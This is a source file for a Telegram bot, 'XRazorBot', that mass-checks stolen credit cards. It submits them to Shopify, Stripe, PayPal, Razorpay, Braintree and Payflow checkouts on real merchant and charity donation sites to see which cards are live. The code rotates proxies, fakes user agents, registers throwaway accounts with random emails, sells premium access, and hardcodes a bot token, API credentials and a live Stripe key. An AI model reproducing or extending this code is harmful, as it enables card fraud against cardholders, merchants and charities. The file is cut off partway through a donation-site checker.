from telethon import TelegramClient, events, Button
import asyncio
import aiohttp
import aiofiles
import os
import random
import time
import json
import re
from datetime import datetime
import uuid
import warnings
from fake_useragent import UserAgent
from html import unescape
from httpx import AsyncClient
import requests
import base64
from curl_cffi import requests as cfrequests
import string
from requests_toolbelt.multipart.encoder import MultipartEncoder
import threading
import traceback

warnings.filterwarnings('ignore')

# ================== HARDCODED OWNER ==================
OWNER_ID = 7205267248
DEFAULT_GROUP_ID = -1003718418094
FREE_GROUP_ID =   -1003718418094    # Members of this group can use the bot for free
FREE_GROUP_MAX_CARDS = 200              # Mass-check limit for free-group (non-premium) users
BOT_NAME = "XRazorBot"
BOT_NAME_STYLED = "XRazorBot"

# ================== CONFIGURATION ==================
API_ID = 21124241
API_HASH = 'b7ddce3d3683f54be788fddae73fa468'
BOT_TOKEN = '8894769120:AAGpUWVrxt4jhbeS1xVgXoi6HNbO66XraNA'

PREMIUM_FILE = 'premium.json'
SITES_FILE = 'sites.txt'
PROXY_FILE = 'proxy.txt'
APPROVED_GROUPS_FILE = 'approved_groups.json'
GATEWAY_SETTINGS_FILE = 'gateway_settings.json'
API_SETTINGS_FILE = 'api_settings.json'
USERS_FILE = 'users.json'
FORWARD_QUEUE_FILE = 'forward_queue.json'
REDEEM_FILE = 'redeem_codes.json'
BANNED_FILE = 'banned.json'

MAX_CARDS = 100000                     # General limit for Shopify / Stripe Auth
RAZORPAY_MASS_LIMIT = 500            # /trz
PAYFLOW_MASS_LIMIT = 100             # /tpf
PAYPAL_MASS_LIMIT = 100              # /mpp (PayPal $1 mass)
STRIPE5_MASS_LIMIT = 100             # /tst
MAX_SITES_PER_UPLOAD = 100150   # Maximum sites added per /tas command

# Shopify APIs
PROXY_API_URL = 'https://web-production-b4ec9.up.railway.app/shopify'
PROXYLESS_API_1 = 'https://web-production-b4ec9.up.railway.app/shopify'
PROXYLESS_API_2 = 'https://web-production-b4ec9.up.railway.app/shopify'
PROXYLESS_SITES = [
    'https://touch-of-finland.myshopify.com',
    'https://charles-m-schulz-museum.myshopify.com'
]

# PayPal Gateway ($1) – for single & mass
PAYPAL_SITE = "https://www.rarediseasesinternational.org/donate/"
PAYPAL_AMOUNT = "1.00"

# PayPal2 Gateway ($0.01)
PAYPAL2_AMOUNT = "0.01"
PAYPAL2_SITE = "https://www.paypal.com/smart/card-fields"

# Stripe Auth site
STRIPE_AUTH_SITE = 'https://www.eastlondonprintmakers.co.uk/my-account/add-payment-method/'

# Stripe Donation site
STRIPE_DONATION_URL = "https://www.forechrist.com/donations/dress-a-student-second-round-of-donations-2/"
STRIPE_DONATION_KEY = "pk_live_51OvrJGRxAfihbegmoT7FwLu2sYpSqHUKvQpNDKyhgVkpNtkoU4bypkWfTsk5A3JLg7o7X1Fsrfwisy2cGnMDd5Lc00qvS6YatH"

# Razorpay Gateway
RAZORPAY_API_URL_OLD = "https://web-production-07260.up.railway.app/razorpay"
RAZORPAY_API_URL_NEW = "https://web-production-07260.up.railway.app/razorpay"
RAZORPAY_API_KEY = "aiojames"
RAZORPAY_SITES = ["https://pages.razorpay.com/angroos"]
RAZORPAY_AMOUNT = 1

# Stripe $5 Gateway
STRIPE5_URL = "https://www.galaxie.com/subscribe/2"
STRIPE5_AMOUNT = "$5"

# Braintree Gateway
BRAINTREE_SITE_URL = "https://buckmans.com"
BRAINTREE_PRODUCT_URL = f"{BRAINTREE_SITE_URL}/product/stickers/45050/buckmans-shield-sticker"
BRAINTREE_CHECKOUT_URL = f"{BRAINTREE_SITE_URL}/store/checkout/index.aspx"
BRAINTREE_REVIEW_URL = f"{BRAINTREE_SITE_URL}/store/checkout/review-order.aspx"
BRAINTREE_GRAPHQL = "https://payments.braintree-api.com/graphql"

# Payflow Gateway ($18)
PAYFLOW_BASE_URL = "https://www.magnifier.com"
PAYFLOW_AMOUNT = "$18"

# Workers
ERROR_SLEEP_SECONDS = 150
CARD_DELAY_SECONDS = 5
SHOPIFY_PROXY_WORKERS = 10
SHOPIFY_PROXYLESS_WORKERS = 10          # all users can use proxyless Shopify mass
STRIPE_MASS_WORKERS = 4
STRIPE5_PROXY_WORKERS = 10
STRIPE5_PROXYLESS_WORKERS = 1           # owner only for proxyless stripe5
PAYPAL_MASS_WORKERS = 8                # for /mpp (PayPal $1 mass)
PAYFLOW_PROXY_WORKERS = 8               # for /tpf (Payflow mass) with proxy
PAYFLOW_PROXYLESS_WORKERS = 1           # owner only proxyless Payflow
RAZORPAY_MASS_WORKERS = 5               # for /trz

# ================== PREMIUM EMOJIS ==================
PREMIUM_EMOJI_IDS = {
    "✅": "6023660820544623088", "🔥": "5424972470023104089", "❌": "5210952531676504517",
    "⚡": "5456140674028019486", "💳": "5971944878815317190", "💠": "5971837723676249096",
    "📝": "5836954069586946866", "🌐": "5447410659077661506", "🎯": "5974235702701853774",
    "🤖": "6057466460886799210", "💰": "5971944878815317190", "⏸️": "5359543311897998264",
    "▶️": "5348125953090403204", "🛑": "5420323339723881652", "📊": "5971837723676249096",
    "📦": "6066395745139824604", "📋": "5974235702701853774", "🔄": "5971837723676249096",
    "⏳": "5971837723676249096", "🚀": "6282977077427702833", "⚠️": "5420323339723881652",
    "💎": "5427168083074628963", "🔍": "5231012545799666522", "📢": "6023660820544623088",
    "⭐️": "6298821774423361023", "✨": "5325547803936572038", "⌛": "5386367538735104399",
    "💵": "5409048419211682843", "✔️": "5206607081334906820", "👀": "5210956306952758910",
    "🎉": "5461151367559141950", "⚡️": "5456140674028019486", "🫦": "5395444514028529554",
    "🚫": "5240241223632954241", "🧿": "5429159208438220860", "👑": "5967497693583380291",
}

def premium_emoji(text):
    if not text:
        return text
    placeholders = []
    result = text
    for i, (emoji, doc_id) in enumerate(PREMIUM_EMOJI_IDS.items()):
        placeholder = f"\x00PE{i:02d}\x00"
        placeholders.append((placeholder, doc_id, emoji))
        result = result.replace(emoji, placeholder)
    for placeholder, doc_id, emoji in placeholders:
        result = result.replace(placeholder, f'<tg-emoji emoji-id="{doc_id}">{emoji}</tg-emoji>')
    return result

async def pin_charged_message(chat_id, message_id):
    """Pin a message if the bot has permission (admin in groups, always in private)."""
    try:
        await bot.pin_message(chat_id, message_id, notify=False)
    except Exception as e:
        # Silently fail (no permissions or other error)
        pass
        
# ================== FILE HELPERS ==================
def load_json(file, default):
    if not os.path.exists(file):
        return default
    try:
        with open(file, 'r', encoding='utf-8') as f:
            return json.load(f)
    except:
        return default

def save_json(file, data):
    with open(file, 'w', encoding='utf-8') as f:
        json.dump(data, f, indent=4)

def load_premium_users():
    data = load_json(PREMIUM_FILE, {})
    now = time.time()
    expired = [uid for uid, exp in data.items() if exp <= now]
    for uid in expired:
        del data[uid]
    if expired:
        save_json(PREMIUM_FILE, data)
    return data

def is_premium(user_id):
    data = load_premium_users()
    exp = data.get(str(user_id))
    return exp is not None and exp > time.time()

def load_approved_groups():
    return load_json(APPROVED_GROUPS_FILE, [DEFAULT_GROUP_ID])

def save_approved_groups(groups):
    save_json(APPROVED_GROUPS_FILE, groups)

def is_group_approved(group_id):
    return group_id in load_approved_groups()

def load_gateway_settings():
    default = {
        "shopify": {"enabled": True, "single": True, "mass": True},
        "paypal": {"enabled": True, "single": True, "mass": False},
        "paypal2": {"enabled": True, "single": True, "mass": False},
        "stripe_auth": {"enabled": True, "single": True, "mass": True},
        "stripe_donation": {"enabled": True, "single": True, "mass": False},
        "razorpay": {"enabled": True, "single": True, "mass": False},
        "stripe5": {"enabled": True, "single": True, "mass": True},
        "braintree": {"enabled": True, "single": True, "mass": False},
        "payflow": {"enabled": True, "single": True, "mass": False},
    }
    return load_json(GATEWAY_SETTINGS_FILE, default)

def save_gateway_settings(settings):
    save_json(GATEWAY_SETTINGS_FILE, settings)

def load_api_settings():
    default = {
        "shopify_proxyless_apis": [PROXYLESS_API_1, PROXYLESS_API_2],
        "shopify_proxyless_sites": PROXYLESS_SITES
    }
    return load_json(API_SETTINGS_FILE, default)

def save_api_settings(settings):
    save_json(API_SETTINGS_FILE, settings)

def add_user_for_broadcast(user_id):
    users = load_json(USERS_FILE, [])
    if user_id not in users:
        users.append(user_id)
        save_json(USERS_FILE, users)

def is_banned(user_id):
    banned = load_json(BANNED_FILE, [])
    return user_id in banned

def ban_user(user_id):
    banned = load_json(BANNED_FILE, [])
    if user_id not in banned:
        banned.append(user_id)
        save_json(BANNED_FILE, banned)
        return True
    return False

def unban_user(user_id):
    banned = load_json(BANNED_FILE, [])
    if user_id in banned:
        banned.remove(user_id)
        save_json(BANNED_FILE, banned)
        return True
    return False

def load_sites():
    if not os.path.exists(SITES_FILE):
        return []
    with open(SITES_FILE, 'r', encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f if line.strip()]

def load_proxies():
    if not os.path.exists(PROXY_FILE):
        return []
    with open(PROXY_FILE, 'r', encoding='utf-8', errors='ignore') as f:
        return [line.strip() for line in f if line.strip()]

def save_proxies(proxies):
    with open(PROXY_FILE, 'w', encoding='utf-8') as f:
        for p in proxies:
            f.write(f"{p}\n")

def is_free_group(event):
    """Returns True if the event was sent in the free-access group."""
    try:
        return event.chat_id == FREE_GROUP_ID
    except:
        return False

def can_use_bot(event):
    user_id = event.sender_id
    if user_id == OWNER_ID:
        return True
    if is_banned(user_id):
        return False
    if is_premium(user_id):
        return True
    if is_free_group(event):
        return True
    return False

def get_plan_badge(user_id):
    if isinstance(user_id, dict):
        user_id = user_id.get('id', 0)
    if user_id == OWNER_ID:
        return "Owner 🎭"
    if is_premium(user_id):
        return "Pro 💎"
    return "Free 🤡"

def is_free_user_in_free_group(event):
    """Non-premium, non-owner user using the bot via the free group."""
    user_id = event.sender_id
    if user_id == OWNER_ID:
        return False
    if is_premium(user_id):
        return False
    return is_free_group(event)

def ensure_file_writable(filepath):
    """Test if we can write to the file. Prints error if not."""
    try:
        with open(filepath, 'a'):
            os.utime(filepath, None)
        return True
    except Exception as e:
        print(f"[ERROR] Cannot write to {filepath}: {e}")
        return False

# ================== PROXY TESTING ==================
async def test_proxy(proxy: str) -> bool:
    """Test a proxy using the Shopify API. Returns True only if proxy works."""
    test_card = "5154623245618097|03|2032|156"
    test_site = "https://riverbendhomedev.myshopify.com"
    try:
        from urllib.parse import quote
        params = {
            'cc': test_card,
            'site': test_site,
            'proxy': quote(proxy, safe='')
        }
        timeout = aiohttp.ClientTimeout(total=30)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(PROXY_API_URL, params=params) as resp:
                if resp.status != 200:
                    return False
                raw = await resp.json(content_type=None)
        # Check if the API returned a success indicator (not a dead proxy error)
        response_msg = raw.get('Response', '').lower()
        # If the response contains a real card result (even declined), the proxy is alive.
        # But if it contains proxy errors, it's dead.
        if 'proxy dead' in response_msg or 'invalid proxy' in response_msg or 'cannot connect' in response_msg:
            return False
        # If we got a proper JSON with 'Response' (even if card fails), proxy is alive.
        return True
    except Exception as e:
        print(f"[DEBUG] Proxy test failed for {proxy}: {e}")
        return False
    

# ================== CC PARSER ==================
def extract_cc_from_text(text):
    pattern = r'(\d{15,16})\|(\d{2})\|(\d{2,4})\|(\d{3,4})'
    match = re.search(pattern, text)
    if match:
        card, mm, yy, cvv = match.groups()
        if len(yy) == 2:
            yy = "20" + yy
        return f"{card}|{mm}|{yy}|{cvv}"
    match = re.search(r'(\d{15,16})\|(\d{2})/(\d{2,4})\|(\d{3,4})', text)
    if match:
        card, mm, yy, cvv = match.groups()
        if len(yy) == 2:
            yy = "20" + yy
        return f"{card}|{mm}|{yy}|{cvv}"
    match = re.search(r'(\d{15,16})\s+(\d{2})\s+(\d{2,4})\s+(\d{3,4})', text)
    if match:
        card, mm, yy, cvv = match.groups()
        if len(yy) == 2:
            yy = "20" + yy
        return f"{card}|{mm}|{yy}|{cvv}"
    return None

def parse_cc(cc_str):
    parts = cc_str.split('|')
    if len(parts) >= 4:
        cc = parts[0].strip()
        mm = parts[1].strip().zfill(2)
        yy = parts[2].strip()
        cvv = parts[3].strip()
        if len(yy) == 2:
            yy = "20" + yy
        return {"number": cc, "mm": mm, "yy": yy, "cvc": cvv}
    return None

# ================== BIN INFO ==================
async def get_bin_info(card_number):
    try:
        bin_number = card_number[:6]
        timeout = aiohttp.ClientTimeout(total=10)
        async with aiohttp.ClientSession(timeout=timeout) as session:
            async with session.get(f'https://bins.antipublic.cc/bins/{bin_number}') as res:
                if res.status != 200:
                    return '-', '-', '-', '-', '-', ''
                data = await res.json()
                brand = data.get('brand', '-')
                bin_type = data.get('type', '-')
                level = data.get('level', '-')
                bank = data.get('bank', '-')
                country = data.get('country_name', '-')
                flag = data.get('country_flag', '')
                return brand, bin_type, level, bank, country, flag
    except:
        return '-', '-', '-', '-', '-', ''

# ========== SHOPIFY CHECKER ==========
_DEAD_INDICATORS = (
    'receipt id is empty', 'handle is empty', 'product id is empty',
    'tax amount is empty', 'payment method identifier is empty',
    'invalid url', 'error in 1st req', 'error in 1 req',
    'cloudflare', 'connection failed', 'timed out', 'access denied',
    'tlsv1 alert', 'ssl routines', 'could not resolve', 'domain name not found',
    'name or service not known', 'openssl ssl_connect', 'empty reply from server',
    'httperror504', 'http error', 'timeout', 'unreachable', 'ssl error',
    '502', '503', '504', 'bad gateway', 'service unavailable', 'gateway timeout',
    'network error', 'connection reset', 'failed to detect product',
    'failed to create checkout', 'failed to tokenize card', 'failed to get proposal data',
    'submit rejected', 'handle error', 'http 404',
    'delivery_delivery_line_detail_changed', 'delivery_address2_required',
    'url rejected', 'malformed input', 'amount_too_small', 'amount too small',
    'site dead', 'captcha_required', 'site errors', 'failed',
    'all products sold out', 'no_session_token', 'tokenize_fail', 'site error',
    'status: 429', '429', 'could not resolve', 'connection refused', 'empty reply', 'bad gateway',
    'service unavailable', 'site not supported', 'no valid products found',
    'proxy error', 'cannot connect to host', 'not a shopify Site', ' not Shopify site', 'Site requires login!','policy_class','Empty submit response','error:','products',
    'no valid payment method found'
)

def is_dead_site_error(error_msg):
    if not error_msg:
        return True
    error_lower = str(error_msg).lower()
    return any(keyword in error_lower for keyword in _DEAD_INDICATORS)

async def check_card_shopify(card, site, proxy, use_proxy_api, use_random_sites=False):
    # 🔥 KILL ALL PROXY ENVIRONMENT VARIABLES
    import os
    os.environ.pop('HTTP_PROXY', None)
    os.environ.pop('HTTPS_PROXY', None)
    os.environ.pop('http_proxy', None)
    os.environ.pop('https_proxy', None)
    os.environ['NO_PROXY'] = '*'

    try:
        if use_proxy_api:
            if not proxy:
                return {'status': 'Site Error', 'message': 'Proxy required', 'card': card, 'retry': False}
            # New API expects 'site' and 'proxy' as query parameters
            from urllib.parse import quote
            params = {
                'cc': card,
                'site': site,
                'proxy': quote(proxy, safe='')
            }
            url = PROXY_API_URL
            timeout = aiohttp.ClientTimeout(total=120)
            async with aiohttp.ClientSession(timeout=timeout) as session:
                async with session.get(url, params=params) as resp:
                    raw = await resp.json(content_type=None)
            response_msg = raw.get('Response', '')
            price = raw.get('Price', '-')
            gate = raw.get('Gate', 'shopiii')
            status = raw.get('Status', '')
        else:
            import requests
            from urllib.parse import quote

            api_settings = load_api_settings()
            apis = api_settings.get('shopify_proxyless_apis', [PROXYLESS_API_1, PROXYLESS_API_2])

            if use_random_sites:
                sites = load_sites()
                if not sites:
                    return {'status': 'Site Error', 'message': 'No sites available', 'card': card, 'retry': True, 'gateway': 'shopiii', 'price': '-'}
                unique_sites = list(dict.fromkeys(sites))
                random.shuffle(unique_sites)
                sites_list = unique_sites[:min(5, len(unique_sites))]
                if not sites_list:
                    return {'status': 'Site Error', 'message': 'No sites available', 'card': card, 'retry': True, 'gateway': 'shopiii', 'price': '-'}
            else:
                sites_list = api_settings.get('shopify_proxyless_sites', PROXYLESS_SITES)

            last_error = None
            response_msg = ''
            price = '-'
            gate = 'shopiii'
            status = False
            chosen_site = None

            def call_api(api_url, site_url, card_str):
                encoded_card = quote(card_str, safe='')
                if api_url == PROXYLESS_API_1:
                    full_url = f"{api_url}?url={site_url}&cc={encoded_card}"
                else:
                    full_url = f"{api_url}?cc={encoded_card}&site={site_url}"
                sess = requests.Session()
                sess.trust_env = False
                sess.proxies = {"http": None, "https": None}
                resp = sess.get(full_url, timeout=60, verify=False)
                if resp.status_code != 200:
                    return None
                return resp.json()

            for site_url in sites_list:
                for api_url in apis:
                    try:
                        loop = asyncio.get_event_loop()
                        raw = await loop.run_in_executor(None, call_api, api_url, site_url, card)
                        if raw is None:
                            continue
                        response_msg = raw.get('Response', '')
                        price = raw.get('Price', '-')
                        gate = raw.get('Gateway', 'shopiii')
                        status = raw.get('Status', False)
                        last_error = None
                        chosen_site = site_url
                        break
                    except Exception as e:
                        last_error = str(e)
                        continue
                if last_error is None:
                    break
            else:
                error = last_error or 'All APIs/sites failed'
                return {'status': 'Site Error', 'message': error, 'card': card, 'retry': True, 'gateway': 'shopiii', 'price': '-'}
            site = chosen_site

        if not response_msg and status is None:
            response_msg = "API returned empty response"
        if is_dead_site_error(response_msg):
            return {'status': 'Site Error', 'message': response_msg, 'card': card, 'retry': True, 'gateway': gate, 'price': price}

        response_lower = response_msg.lower()
        status_lower = str(status).lower()

        # ----- 1) CHARGED / APPROVED (highest priority) -----
        if status == 'Charged' or 'order completed' in response_lower or 'order_placed' in response_lower or '💎' in response_msg:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        if 'thank you' in response_lower or 'payment successful' in response_lower:
            return {'status': 'Charged', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        if status == 'Approved' or any(key in response_lower for key in [
            'approved', 'success', 'insufficient_funds', 'insufficient funds',
            'invalid_cvv', 'incorrect_cvv', 'invalid_cvc', 'incorrect_cvc',
            'invalid cvv', 'incorrect cvv', 'invalid cvc', 'incorrect cvc',
            'incorrect_zip', 'incorrect zip'
        ]):
            return {'status': 'Approved', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}

        # ----- 2) 3DS / OTP detection -----
        if 'otp_required' in response_lower or '3d_secure' in response_lower:
            return {'status': '3DS_REQUIRED', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        if 'ds_required' in response_lower or status_lower in ('ds_required', '3ds_required'):
            return {'status': '3DS_REQUIRED', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}
        ds_required_match = re.search(r'(?<!\w)ds_required\s*[:=]\s*true\b', response_lower)
        if ds_required_match:
            return {'status': '3DS_REQUIRED', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}

        # ----- 3) Site errors -----
        if 'cloudflare bypass failed' in response_lower:
            return {'status': 'Site Error', 'message': 'Cloudflare spotted', 'card': card, 'retry': True, 'gateway': gate, 'price': price}

        # ----- 4) Fallback -----
        return {'status': 'Dead', 'message': response_msg, 'card': card, 'site': site, 'gateway': gate, 'price': price}

    except asyncio.TimeoutError:
        return {'status': 'Site Error', 'message': 'Request timeout', 'card': card, 'retry': True}
    except Exception as e:
        error_msg = str(e)
        if is_dead_site_error(error_msg):
            return {'status': 'Site Error', 'message': error_msg, 'card': card, 'retry': True}
        return {'status': 'Dead', 'message': error_msg, 'card': card, 'gateway': 'shopify', 'price': '-'}
    

        
# ================== STRIPE AUTH CHECKER ==================
def getvalue(data, start, end):
    try:
        star = data.index(start) + len(start)
        last = data.index(end, star)
        return data[star:last]
    except ValueError:
        return None

def generate_random_email():
    username = ''.join(random.choices(string.ascii_lowercase, k=random.randint(8, 12)))
    number = random.randint(100, 9999)
    domains = ['gmail.com', 'yahoo.com', 'outlook.com', 'protonmail.com']
    return f"{username}{number}@{random.choice(domains)}"

def generate_guid():
    return str(uuid.uuid4())

async def process_stripe_auth_card(card_data, proxy_url=None):
    site_url = STRIPE_AUTH_SITE
    try:
        if not site_url.startswith('http'):
            site_url = 'https://' + site_url
        timeout = aiohttp.ClientTimeout(total=70)
        connector = aiohttp.TCPConnector(ssl=False)
        async with aiohttp.ClientSession(timeout=timeout, connector=connector) as session:
            from urllib.parse import urlparse
            parsed = urlparse(site_url)
            domain = f"{parsed.scheme}://{parsed.netloc}"
            email = generate_random_email()
            headers = {
                'accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8',
                'user-agent': UserAgent().random
            }
            resp = await session.get(site_url, headers=headers, proxy=proxy_url)
            resp_text = await resp.text()
            register_nonce = (getvalue(resp_text, 'woocommerce-register-nonce" value="', '"') or 
                             getvalue(resp_text, 'id="woocommerce-register-nonce" value="', '"') or 
                             getvalue(resp_text, 'name="woocommerce-register-nonce" value="', '"'))
            if register_nonce:
                username = email.split('@')[0]
                password = f"Pass{random.randint(100000, 999999)}!"
                register_data = {
                    'email': email,
                    'wc_order_attribution_source_type': 'typein',
                    'wc_order_attribution_referrer': '(none)',
                    'wc_order_attribution_utm_campaign': '(none)',
                    'wc_order_attribution_utm_source': '(direct)',
                    'wc_order_attribution_utm_medium': '(none)',
                    'wc_order_attribution_utm_content': '(none)',
                    'wc_order_attribution_utm_id': '(none)',
                    'wc_order_attribution_utm_term': '(none)',
                    'wc_order_attribution_utm_source_platform': '(none)',
                    'wc_order_attribution_utm_creative_format': '(none)',
                    'wc_order_attribution_utm_marketing_tactic': '(none)',
                    'wc_order_attribution_session_entry': site_url,
                    'wc_order_attribution_session_start_time': datetime.now().strftime('%Y-%m-%d %H:%M:%S'),
                    'wc_order_attribution_session_pages': '1',
                    'wc_order_attribution_session_count': '1',
                    'wc_order_attribution_user_agent': headers['user-agent'],
                    'woocommerce-register-nonce': register_nonce,
                    '_wp_http_referer': '/my-account/',
                    'register': 'Register'
                }
                reg_resp = await session.post(site_url, headers=headers, data=register_data, proxy=proxy_url)
                reg_text = await reg_resp.text()
                if 'customer-logout' not in reg_text and 'dashboard' not in reg_text.lower():
                    resp = await session.get(site_url, headers=headers, proxy=proxy_url)
                    resp_text = await resp.text()
                    login_nonce = getvalue(resp_text, 'woocommerce-login-nonce" value="', '"')
                    if login_nonce:
                        login_data = {
                            'username': username,
                            'password': password,
                            'woocommerce-login-nonce': login_nonce,
                            'login': 'Log in'
                        }
                        await session.post(site_url, headers=headers, data=login_data, proxy=proxy_url)
            add_payment_url = site_url.rstrip('/') + '/add-payment-method/'
            if '/my-account/add-payment-method' not in add_payment_url:
                add_payment_url = f"{domain}/my-account/add-payment-method/"
            headers = {'user-agent': UserAgent().random}
            resp = await session.get(add_payment_url, headers=headers, proxy=proxy_url)
            payment_page_text = await resp.text()
            add_card_nonce = (getvalue(payment_page_text, 'createAndConfirmSetupIntentNonce":"', '"') or 
                             getvalue(payment_page_text, 'add_card_nonce":"', '"') or 
                             getvalue(payment_page_text, 'name="add_payment_method_nonce" value="', '"') or 
                             getvalue(payment_page_text, 'wc_stripe_add_payment_method_nonce":"', '"'))
            stripe_key = (getvalue(payment_page_text, '"key":"pk_', '"') or 
                         getvalue(payment_page_text, 'data-key="pk_', '"') or 
                         getvalue(payment_page_text, 'stripe_key":"pk_', '"') or 
                         getvalue(payment_page_text, 'publishable_key":"pk_', '"'))
            if not stripe_key:
                pk_match = re.search(r'pk_live_[a-zA-Z0-9]{24,}', payment_page_text)
                if pk_match:
                    stripe_key = pk_match.group(0)
            if not stripe_key:
                stripe_key = 'pk_live_VkUTgutos6iSUgA9ju6LyT7f00xxE5JjCv'
            elif not stripe_key.startswith('pk_'):
                stripe_key = 'pk_' + stripe_key
            stripe_headers = {
                'accept': 'application/json',
                'content-type': 'application/x-www-form-urlencoded',
                'origin': 'https://js.stripe.com',
                'referer': 'https://js.stripe.com/',
                'user-agent': UserAgent().random
            }
            stripe_data = {
                'type': 'card',
                'card[number]': card_data['number'],
                'card[cvc]': card_data['cvc'],
                'card[exp_month]': card_data['exp_month'],
                'card[exp_year]': card_data['exp_year'],
                'allow_redisplay': 'unspecified',
                'billing_details[address][country]': 'AU',
                'payment_user_agent': 'stripe.js/5e27053bf5; stripe-js-v3/5e27053bf5; payment-element; deferred-intent',
                'referrer': domain,
                'client_attribution_metadata[client_session_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_source]': 'elements',
                'client_attribution_metadata[merchant_integration_subtype]': 'payment-element',
                'client_attribution_metadata[merchant_integration_version]': '2021',
                'client_attribution_metadata[payment_intent_creation_flow]': 'deferred',
                'client_attribution_metadata[payment_method_selection_flow]': 'merchant_specified',
                'client_attribution_metadata[elements_session_config_id]': generate_guid(),
                'client_attribution_metadata[merchant_integration_additional_elements][0]': 'payment',
                'guid': generate_guid(),
                'muid': generate_guid(),
                'sid': generate_guid(),
                'key': stripe_key,
                '_stripe_version': '2024-06-20'
            }
            pm_resp = await session.post('https://api.stripe.com/v1/payment_methods', headers=stripe_headers, data=stripe_data, proxy=proxy_url)
            pm_json = await pm_resp.json()
            if 'error' in pm_json:
                return False, pm_json['error']['message']
            pm_id = pm_json.get('id')
            if not pm_id:
                return False, 'Failed to create Payment Method'
            confirm_headers = {
                'accept': 'application/json, text/javascript, */*; q=0.01',
                'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
                'origin': domain,
                'x-requested-with': 'XMLHttpRequest',
                'user-agent': UserAgent().random
            }
            endpoints = [
                {'url': f"{domain}/?wc-ajax=wc_stripe_create_and_confirm_setup_intent", 'data': {'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/wp-admin/admin-ajax.php", 'data': {'action': 'wc_stripe_create_and_confirm_setup_intent', 'wc-stripe-payment-method': pm_id}},
                {'url': f"{domain}/?wc-ajax=add_payment_method", 'data': {'wc-stripe-payment-method': pm_id, 'payment_method': 'stripe'}}
            ]
            for endp in endpoints:
                if not add_card_nonce:
                    continue
                if 'add_payment_method' in endp['url']:
                    endp['data']['woocommerce-add-payment-method-nonce'] = add_card_nonce
                else:
                    endp['data']['_ajax_nonce'] = add_card_nonce
                endp['data']['wc-stripe-payment-type'] = 'card'
                try:
                    res = await session.post(endp['url'], data=endp['data'], headers=confirm_headers, proxy=proxy_url)
                    text = await res.text()
                    if 'success' in text:
                        js = json.loads(text)
                        if js.get('success'):
                            status = js.get('data', {}).get('status')
                            return True, f"Approved (Status: {status})"
                        else:
                            error_msg = js.get('data', {}).get('error', {}).get('message', 'Declined')
                            return False, error_msg
                except:
                    continue
            return False, 'Confirmation failed on site'
    except Exception as e:
        return False, f'System Error: {str(e)}'

async def check_stripe_auth_card(cc_str: str, proxy: str = None):
    card_data_parsed = parse_cc(cc_str)
    if not card_data_parsed:
        return {'status': 'ERROR', 'message': 'Invalid format', 'gateway': 'Stripe Auth', 'card': cc_str}
    card_data = {
        'number': card_data_parsed['number'],
        'exp_month': card_data_parsed['mm'],
        'exp_year': card_data_parsed['yy'][-2:],
        'cvc': card_data_parsed['cvc']
    }
    is_approved, response_msg = await process_stripe_auth_card(card_data, proxy_url=proxy)
    if is_approved or 'requires_action' in response_msg.lower() or 'succeeded' in response_msg.lower():
        return {'status': 'APPROVED', 'message': response_msg, 'gateway': 'Stripe Auth', 'card': cc_str}
    else:
        return {'status': 'DECLINED', 'message': response_msg, 'gateway': 'Stripe Auth', 'card': cc_str}

# ================== STRIPE DONATION CHECKER ==================
async def check_stripe_donation_card(cc_str: str):
    card = parse_cc(cc_str)
    if not card:
        return {'status': 'ERROR', 'message': 'Invalid format', 'gateway': 'Stripe Donation', 'price': '$1.00', 'card': cc_str}
    first_names = ['willam','james','john','robert','michael']
    last_names = ['dives','smith','johnson','brown','jones']
    first = random.choice(first_names)
    last = random.choice(last_names)
    email = f"{first}{random.randint(1000,99999)}@{random.choice(['gmail.com','yahoo.com','outlook.com'])}"
    ua = UserAgent()
    async with aiohttp.ClientSession() as session:
        stripe_url = "https://api.stripe.com/v1/payment_methods"
        stripe_data = {
            'type': 'card',
            'billing_details[name]': f"{first} {last}",
            'billing_details[email]': email,
            'card[number]': card['number'],
            'card[cvc]': card['cvc'],
            'card[exp_month]': card['mm'],
            'card[exp_year]': card['yy'][-2:],
            'guid': str(uuid.uuid4()),
            'muid': str(uuid.uuid4()),
            'sid': str(uuid.uuid4()),
            'payment_user_agent': 'stripe.js/67c5b8132f; stripe-js-v3/67c5b8132f; split-card-element',
            'referrer': 'https://www.forechrist.com',
            'key': STRIPE_DONATION_KEY,
        }
        try:
            headers = {'User-Agent': ua.random}
            async with session.post(stripe_url, data=stripe_data, headers=headers) as resp:
                if resp.status != 200:
                    return {'status': 'ERROR', 'message': f'Stripe API error ({resp.status})', 'gateway': 'Stripe Donation', 'card': cc_str}
                pm_json = await resp.json()
            if 'error' in pm_json:
                error_msg = pm_json['error'].get('message','')
                if 'declined' in error_msg.lower():
                    return {'status': 'DECLINED', 'message': 'Your card was declined', 'gateway': 'Stripe Donation', 'card': cc_str}
                else:
                    return {'status': 'ERROR', 'message': error_msg, 'gateway': 'Stripe Donation', 'card': cc_str}
            pm_id = pm_json['id']
        except Exception as e:
            return {'status': 'ERROR', 'message': f'Stripe request failed: {str(e)}', 'gateway': 'Stripe Donation', 'card': cc_str}
        ajax_url = "https://www.forechrist.com/wp-admin/admin-ajax.php"
        reset_nonce_data = {'action': 'give_donation_form_reset_all_nonce', 'give_form_id': '31358'}
        try:
            async with session.post(ajax_url, data=reset_nonce_data, headers=headers) as resp:
                if resp.status == 200:
                    reset_json = await resp.json()
                    form_hash = reset_json.get('data',{}).get('give_form_hash','7cce7c4e02')
                else:
                    form_hash = '7cce7c4e02'
        except:
            form_hash = '7cce7c4e02'
        final_url = "https://www.forechrist.com/donations/dress-a-student-second-round-of-donations-2/?payment-mode=stripe&form-id=31358"
        donation_data = {
            'give-fee-amount': '0.34', 'give-fee-mode-enable': 'false', 'give-fee-status': 'enabled',
            'give-honeypot': '', 'give-form-id-prefix': '31358-1', 'give-form-id': '31358',
            'give-form-title': 'Dress a Student – Second Round of Donations',
